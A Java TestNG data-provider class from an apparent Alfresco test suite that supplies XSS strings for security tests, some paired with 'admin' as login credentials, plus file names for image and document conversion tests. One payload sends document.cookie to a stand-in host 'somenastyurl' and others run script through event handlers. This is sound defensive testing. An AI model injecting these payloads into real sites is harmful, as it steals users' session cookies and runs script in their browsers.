package org.alfresco.common;

import org.testng.annotations.DataProvider;

public class DataProviderClass
{
    /**
     * Data Provider with 'XSS Strings' used for Security tests
     *
     * @return XSS strings
     */
    @DataProvider (name = "XSSSecurity")
    public static Object[][] XSSSecurity()
    {
        return new Object[][] {
            { "<IMG \"\"\"><SCRIPT>alert(\"test\")</SCRIPT>\">" },
            { "<img src=\"1\" onerror=\"window.open('http://somenastyurl?'+(document.cookie))\">" },
            { "<img><scrip<script>t>alert('XSS');<</script>/script>" },
            { "<DIV STYLE=\"width: expression(alert('XSS'));\">" },
            { "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">" },
            { "<input onfocus=write(1) autofocus>" },
            { "<input onblur=write(1) autofocus><input autofocus>" },
            { "<body oninput=alert(1)><input autofocus>" },
            { "<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>" },
            { "<form id=\"test\" /><button form=\"test\" formaction=\"javascript:alert(1)\">X" }
        };
    }


    /**
     * Data Provider with invalid credentials (XSS String).
     *
     * @return 1. XSS username and admin password
     * 2. Admin username and XSS password
     */
    @DataProvider (name = "XSSCredentials")
    public static Object[][] XSSCredentials()
    {
        return new Object[][] {
            { "<IMG \"\"\"><SCRIPT>alert(\"test\")</SCRIPT>\">", "admin" },
            { "admin", "<IMG \"\"\"><SCRIPT>alert(\"test\")</SCRIPT>\">" },
            { "<img src=\"1\" onerror=\"window.open('http://somenastyurl?'+(document.cookie))\">", "admin" },
            { "admin", "<img src=\"1\" onerror=\"window.open('http://somenastyurl?'+(document.cookie))\">" },
            { "<DIV STYLE=\"width: expression(alert('XSS'));\">", "admin" },
            { "admin", "<DIV STYLE=\"width: expression(alert('XSS'));\">" },
            { "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">", "admin" },
            { "admin", "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">" },
            { "<input onfocus=write(1) autofocus>", "admin" },
            { "admin", "<input onfocus=write(1) autofocus>" },
            { "<input onblur=write(1) autofocus><input autofocus>", "admin" },
            { "admin", "<input onblur=write(1) autofocus><input autofocus>" },
            { "<body oninput=alert(1)><input autofocus>", "admin" },
            { "admin", "<body oninput=alert(1)><input autofocus>" },
            { "<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>", "admin" },
            { "admin", "<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>" },
            { "<form id=\"test\" /><button form=\"test\" formaction=\"javascript:alert(1)\">X", "admin" },
            { "admin", "<form id=\"test\" /><button form=\"test\" formaction=\"javascript:alert(1)\">X" }
        };
    }

    /**
     * Data Provider with list of images for .bmp transformation
     *
     * @return the image from the list that is present in testdata
     */
    @DataProvider (name = "ImageTransformToBMP")
    public static Object[][] ImageTransformToBMP()
    {
        return new Object[][] {
            { "Lighthouse.jpg" },
            { "png_noBackground_file.PNG" },
            { "tif_file.tif" },
            { "gif_animated.gif" }
        };
    }

    /**
     * Data Provider with list of images for .jpg transformation
     *
     * @return the image from the list that is present in testdata
     */
    @DataProvider (name = "ImageTransformToJPG")
    public static Object[][] ImageTransformToJPG()
    {
        return new Object[][] {
            { "newavatar.bmp" },
            { "png_noBackground_file.PNG" },
            { "tif_file.tif" },
            { "gif_animated.gif" }
        };
    }

    /**
     * Data Provider with list of images for .gif transformation
     *
     * @return the image from the list that is present in testdata
     */
    @DataProvider (name = "ImageTransformToGIF")
    public static Object[][] ImageTransformToGIF()
    {
        return new Object[][] {
            { "Lighthouse.jpg" },
            { "png_noBackground_file.PNG" },
            { "tif_file.tif" },
            { "newavatar.bmp" }
        };
    }

    /**
     * Data Provider with list of images for .png transformation
     *
     * @return the image from the list that is present in testdata
     */
    @DataProvider (name = "ImageTransformToPNG")
    public static Object[][] ImageTransformToPNG()
    {
        return new Object[][] {
            { "Lighthouse.jpg" },
            { "gif_animated.gif" },
            { "tif_file.tif" },
            { "newavatar.bmp" }
        };
    }

    /**
     * Data Provider with list of images for .tiff transformation
     *
     * @return the image from the list that is present in testdata
     */
    @DataProvider (name = "ImageTransformToTIFF")
    public static Object[][] ImageTransformToTIFF()
    {
        return new Object[][] {
            { "Lighthouse.jpg" },
            { "gif_animated.gif" },
            { "png_noBackground_file.PNG" },
            { "newavatar.bmp" }
        };
    }

    /**
     * Data Provider with list of documents for .pdf transformation
     *
     * @return the document from the list that is present in testdata
     */
    @DataProvider (name = "DocumentTransformToPDF")
    public static Object[][] DocumentTransformToPDF()
    {
        return new Object[][] {
            { "doc_file.doc" },
            { "xls_file.xls" },
            { "docm_file.docm" },
            { "dotm_file.dotm" },
            { "xlsm_file.xlsm" },
            { "xltm_file.xltm" },
            { "docx_file.docx" },
            { "xlsx_file.xlsx" },
            { "ppt_file.ppt" },
            { "pptx_file.pptx" }
        };
    }

    /**
     * Data Provider with list of large documents for .pdf transformation
     *
     * @return the document from the list that is present in testdata
     */
    @DataProvider (name = "LargeDocumentTransformToPDF")
    public static Object[][] LargeDocumentTransformToPDF()
    {
        return new Object[][] {
            { "doc_large_30mb.doc" },
            { "doc_large_10mb.doc" }
        };
    }

}
